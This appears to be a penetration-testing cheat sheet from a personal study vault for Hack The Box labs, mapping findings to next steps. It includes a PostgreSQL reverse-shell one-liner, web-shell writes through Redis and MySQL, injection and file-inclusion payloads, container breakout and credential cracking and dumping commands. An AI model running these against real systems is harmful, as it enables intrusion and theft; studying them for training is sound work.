---
tags: [pentest, htb, pattern-recognition, cheatcard, both]
type: workflow
---
# When You See X, Do (or Think) Y

The most-referenced file in this vault. Open this every time you find something and aren't sure what's next.

[[00 - README|Folder index]] · [[02 - General Methodology|Methodology]] · [[../00 - Vault Index|Home]]

## Recon / Scanning

| When you see... | Do / think... |
| --- | --- |
| nmap returns "host down" | Add `-Pn` (HTB blocks ICMP). |
| Slow nmap | First scan: `-p- --min-rate 5000 -Pn`. Then targeted scripts on open ports only. |
| Port closed by firewall | Try `--source-port 53` or `--source-port 80`. Try TCP connect (`-sT`). |
| Hostname in nmap output (e.g. `target.htb`) | Add to `/etc/hosts` immediately: `echo "10.10.10.5 target.htb" \| sudo tee -a /etc/hosts`. |
| `Subdomain redirect` in HTTP response | vhost fuzz: `ffuf -u http://ip -H "Host: FUZZ.target.htb" -w subs.txt -fs <baseline>`. |
| TLS cert with subject `*.target.htb` | The cert SAN list is free subdomain enum. `openssl s_client -connect ip:443` → look at "Subject Alternative Name". |
| HTTP 403 on `/admin` | Try header trick: `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`. Try path: `/admin/`, `/admin/.`, `/%2e/admin`. |

## FTP (21)

| When you see... | Do / think... |
| --- | --- |
| Anonymous login allowed | `ls -la`. Look for `.bash_history`, `id_rsa`, configs. `binary; mget *`. |
| vsftpd 2.3.4 | Smiley-face backdoor: `:)` in username triggers shell on 6200. Don't enable on real engagements. |
| Writable directory | Drop a web shell IF the FTP root maps to a web root. |
| Anonymous + web server on same box | `put shell.php` to FTP, browse via web → RCE. |

## SSH (22)

| When you see... | Do / think... |
| --- | --- |
| OpenSSH 7.7 or earlier | Username enumeration CVE-2018-15473. `nmap -p22 --script ssh-enum-users --script-args userdb=users.txt`. |
| `id_rsa` found on box | Crack with `ssh2john id_rsa > h && john --wordlist=rockyou.txt h`. |
| Password reuse hint in notes | Try cracked password as the SSH password for any user found in `/home`. |
| SSH key with passphrase prompt | john it; never just give up. |

## SMB (445/139)

| When you see... | Do / think... |
| --- | --- |
| Anonymous share access | `smbmap -H ip -u anonymous`, look for `Users$`, `Backups`, `IT`. |
| Share called `SYSVOL` or `NETLOGON` | Domain controller. Check for `Groups.xml` with `cpassword` (GPP). Decrypt with `gpp-decrypt`. |
| Share writable + web server | Drop web shell into share if it maps to web root. |
| `IPC$` accessible with `''` `''` | Null session works → `rpcclient -U "" -N ip` → `enumdomusers`. |
| Windows 7 / Server 2008 R2 / fresh | Try MS17-010 EternalBlue. `nmap --script smb-vuln-ms17-010 -p445 ip`. |

## Web (80/443)

| When you see... | Do / think... |
| --- | --- |
| Default Apache/IIS page | Dir brute. Also try common alt ports (8080, 8443, 8000). |
| `?id=1` or any GET param | Try `'`, `"`, `OR 1=1-- -`. If error → sqlmap. |
| `?file=`, `?page=`, `?include=`, `?path=` | LFI/RFI. Try `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`. |
| `?cmd=`, `?host=`, `?ip=`, `?domain=` | Command injection. Try `; id`, `\| id`, `\|\| id`, backticks. Commix automates. |
| Login form | Try `admin:admin`, `admin:password`, default creds. Then Hydra with rockyou (lowest 100 first). |
| Comments in HTML/JS | Read every one. Credentials, hidden endpoints, dev notes. |
| `robots.txt` with `Disallow` | Every disallowed path is a hint. Browse each one. |
| WordPress | `wpscan --url <target> --enumerate u,p,t,vp`. Try `/wp-login.php` for user enum via timing. |
| Drupal | `droopescan scan drupal -u <target>`. Drupalgeddon (CVE-2018-7600) is common. |
| Joomla | `joomscan -u <target>`. |
| jBoss / WildFly | `/admin-console` or `/jmx-console`. Default creds `admin:admin`. |
| Tomcat | `/manager/html` - default creds `tomcat:tomcat`, `tomcat:s3cret`. Upload WAR. See [[../06 - Gaining Access/39 - Tomcat Manager Exploit Chain]]. |
| Jenkins | `/script` Groovy console = RCE if you have any login. |
| Server header revealing exact version | `searchsploit <product> <version>`. |
| Strange port (e.g. 8000, 8888, 10000) | `nmap -sV -p<port>`. Could be Webmin (CVE-2019-15107), Splunk, etc. |

## Database

| When you see... | Do / think... |
| --- | --- |
| MSSQL with `sa:` empty | `impacket-mssqlclient sa:''@ip -windows-auth` → `xp_cmdshell`. |
| MySQL FILE priv | `SELECT '<?php ...?>' INTO OUTFILE '/var/www/html/s.php'`. |
| Redis unauth | `CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET x '<?php ?>'; SAVE`. Or write SSH key. |
| MongoDB unauth | `mongo --host ip` then `show dbs; use <db>; db.users.find()`. |
| PostgreSQL with `COPY ... PROGRAM` | RCE: `COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/.../4444 0>&1';`. |

## Active Directory

| When you see... | Do / think... |
| --- | --- |
| LDAP 389/636 + Kerberos 88 + DNS 53 | Domain Controller. Run BloodHound ASAP. |
| User list from null session / RID cycling | `kerbrute userenum` → AS-REP roast every user. |
| SPN with `MSSQLSvc/`, `HTTP/`, `HOST/` | Kerberoastable. `GetUserSPNs.py -request`. |
| `Domain Users` member with RDP via "Remote Desktop Users" | Direct RDP login may work. Same for "Remote Management Users" → WinRM. |
| `ms-DS-MachineAccountQuota` > 0 | NoPac potential. Or shadow credentials via Kerberos. |
| ADCS template with "Enroll" + "Client Authentication" + "Enrollee supplies subject" | ESC1. Certipy `req` → auth as anyone. |
| `PrintNightmare`-vulnerable patch level | `Get-WinEvent -LogName "Microsoft-Windows-PrintService/Admin"`. CVE-2021-34527. |
| Server 2019, no Aug 2020 patch | ZeroLogon. Test with `zerologon_tester.py` (read-only check). |

## Foothold / shell

| When you see... | Do / think... |
| --- | --- |
| `www-data` shell | Manual enum: `sudo -l`, `find / -perm -u=s 2>/dev/null`, `cat /etc/passwd`, `ls /home`. Then LinPEAS. |
| `sudo -l` shows ANY entry | Check GTFOBins for that binary. 95% of the time it's a win. |
| `tar`, `find`, `vim`, `awk`, `perl` SUID | GTFOBins one-liner → root. |
| `cap_setuid` on python/perl | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` → root. |
| `pkexec` SUID | PwnKit (CVE-2021-4034). Check `/usr/bin/pkexec --version`. |
| Mounted Docker socket `/var/run/docker.sock` | Container breakout → host root. `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`. |
| User in `lxd` or `docker` group | Group → root. |
| Process running as another user (pspy) | Race condition, writable script, or wildcard injection. |
| Cron job calling unqualified binary | PATH hijack: drop fake `tar` in writable dir; prepend dir to PATH. |
| Backup file (`.bak`, `.old`, `.swp`) in webroot | Read it; often source code with credentials. |

## Windows post-foothold

| When you see... | Do / think... |
| --- | --- |
| `SeImpersonatePrivilege` in `whoami /priv` | Potato attack. PrintSpoofer / GodPotato / JuicyPotatoNG. |
| `SeBackupPrivilege` | Read SAM + SYSTEM hives offline, `secretsdump` LOCAL. |
| `SeDebugPrivilege` | Mimikatz can dump LSASS. |
| `SeTakeOwnershipPrivilege` | Take ownership of a file, then add yourself to its ACL. |
| Service path unquoted with space | `sc qc <svc>` to confirm. Drop exe at intermediate path. |
| AlwaysInstallElevated = 1 (HKLM + HKCU) | `msfvenom -p windows/exec ... -f msi -o evil.msi; msiexec /quiet /i evil.msi`. |
| Stored creds in `cmdkey /list` | `runas /savecred /user:DOMAIN\admin cmd.exe` if `/savecred` set. |
| `C:\Inetpub\wwwroot\web.config` | DB connection strings often plaintext. |
| Outlook PST/OST file | Open in `pst-export` or `readpst`. Frequently has internal creds. |

## Generic "I'm stuck" prompts

| Feeling | Do this |
| --- | --- |
| "I've tried every exploit" | Re-run enum. You missed a service, version, or response detail. |
| "Nothing's vulnerable" | Look for hidden ports: `nmap -p- --min-rate 1000` if you only did top-1000. Check UDP top 100. |
| "The cred I cracked doesn't work" | Try it everywhere: SMB, WinRM, RDP, MSSQL, FTP, SSH, web app login. Password reuse is the norm. |
| "I'm in but can't escalate" | `find / -newermt "$(date -d 'today' '+%Y-%m-%d')" 2>/dev/null` - boxes plant artifacts recently. |
| "The exploit POC isn't working" | Read the PoC. Adjust offsets, paths, LHOST. Check the target arch and version exactly. |
| "This feels like a rabbit hole" | Open [[13 - Rabbit Hole Detector]]. Time-box yourself. |

> [!tip] The 90% rule
> 90% of HTB/OSCP-style box solutions come down to: (1) better enumeration, (2) password reuse, (3) GTFOBins/LOLBAS, (4) a public exploit you didn't try yet. The exotic stuff is the last 10%.
